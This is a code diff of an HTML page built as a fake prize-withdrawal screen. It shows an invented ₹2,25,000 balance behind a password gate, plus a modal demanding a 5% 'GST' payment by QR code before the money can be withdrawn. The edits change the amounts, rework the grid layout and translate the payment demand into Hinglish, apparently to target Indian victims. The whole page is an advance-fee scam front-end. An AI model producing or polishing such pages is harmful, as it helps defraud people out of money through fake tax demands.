@@ -39,7 +39,7 @@
 
         /* --- Screen Navigation Classes --- */
         .screen {
-            display: none; /* Hidden by default */
+            display: none;
             flex-direction: column;
             width: 100%;
             min-height: 100vh;
@@ -48,7 +48,7 @@
         }
 
         .screen.active {
-            display: flex; /* Only active screen is shown */
+            display: flex; 
         }
 
         /* =========================================
@@ -125,7 +125,7 @@
             color: #ff4757;
             font-size: 0.85rem;
             margin-bottom: 25px;
-            display: none; /* Hidden by default */
+            display: none; 
             text-align: left;
             padding-left: 5px;
         }
@@ -150,7 +150,7 @@
         }
 
         /* =========================================
-           SCREEN 2: MAIN WITHDRAWAL STYLES (Existing)
+           SCREEN 2: MAIN WITHDRAWAL STYLES 
            ========================================= */
         .header {
             display: flex;
@@ -215,7 +215,7 @@
 
         .amount-grid {
             display: grid;
-            grid-template-columns: repeat(4, 1fr);
+            grid-template-columns: repeat(3, 1fr); /* Changed to 3 columns to fit larger numbers better */
             gap: 12px;
             margin-bottom: 24px;
         }
@@ -288,11 +288,12 @@
         @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
 
         @media (max-width: 360px) {
-            .amount-grid { gap: 8px; }
+            .amount-grid { grid-template-columns: repeat(2, 1fr); gap: 8px; }
             .amount-btn { font-size: 0.85rem; padding: 14px 0; }
             .qr-image-container img { width: 150px; height: 150px; }
             .form-row label { font-size: 0.85rem; }
             .form-row input { font-size: 0.9rem; }
+            .balance-amount { font-size: 1.25rem; }
         }
     </style>
 </head>
@@ -347,12 +348,12 @@
                 
                 <div class="balance-section">
                     <div class="balance-block">
-                        <span class="balance-amount">₹4,50,057.09</span>
+                        <span class="balance-amount">₹2,25,000</span>
                         <span class="balance-text">Balance</span>
                     </div>
                     <div class="divider"></div>
                     <div class="balance-block">
-                        <span class="balance-amount">₹4,50,057.09</span>
+                        <span class="balance-amount">₹2,25,000</span>
                         <span class="balance-text">Withdrawable</span>
                     </div>
                 </div>
@@ -360,8 +361,7 @@
 
             <h2 class="section-label">Withdrawal Amount</h2>
             <div class="amount-grid">
-                <button class="amount-btn active">₹4,50,057.09</button>
-                <button class="amount-btn">₹200</button>
+                <button class="amount-btn active">₹2,25,000</button>
                 <button class="amount-btn">₹500</button>
                 <button class="amount-btn">₹1000</button>
                 <button class="amount-btn">₹2000</button>
@@ -369,6 +369,7 @@
                 <button class="amount-btn">₹10000</button>
                 <button class="amount-btn">₹20000</button>
                 <button class="amount-btn">₹35000</button>
+                <button class="amount-btn">₹50000</button>
             </div>
 
             <h2 class="section-label">Recipient Bank Card</h2>
@@ -389,7 +390,7 @@
 
             <div class="action-section">
                 <button class="verify-btn" id="openModalBtn">Withdrawal</button>
-                <p class="helper-text"><span class="highlight">₹4,50,057.09</span> will be credited after a successful withdrawal.</p>
+                <p class="helper-text"><span class="highlight">₹2,25,000</span> will be credited after a successful withdrawal.</p>
             </div>
         </div>
 
@@ -406,7 +407,7 @@
             <h3 class="modal-title">GST Payment Required</h3>
             
             <p class="modal-text">
-                To withdraw the winning amount please scan the qr to pay <span class="highlight-gst">5% GST</span> =₹12,500
+                Is amount ko withdraw kerne ke liye aapko <span class="highlight-gst">5% GST</span> deni pade gi. Kripya is scanner per payment karen.
             </p>
             
             <div class="qr-image-container">
@@ -444,7 +445,6 @@
                 } else {
                     // Fail: Show error message
                     errorMsg.style.display = 'block';
-                    // Optional: shake animation could go here
                 }
             });
 
@@ -455,7 +455,7 @@
                 }
             });
 
-            // Back button on Main Screen to return to password screen (optional UX improvement)
+            // Back button on Main Screen to return to password screen 
             backToPasswordBtn.addEventListener('click', () => {
                 mainScreen.classList.remove('active');
                 passwordScreen.classList.add('active');
@@ -476,7 +476,7 @@
             });
 
 
-            // --- MAIN WITHDRAWAL PAGE LOGIC (From previous step) ---
+            // --- MAIN WITHDRAWAL PAGE LOGIC ---
             const openModalBtn = document.getElementById('openModalBtn');
             const closeModalBtn = document.getElementById('closeModalBtn');
             const confirmPaidBtn = document.getElementById('confirmPaidBtn');
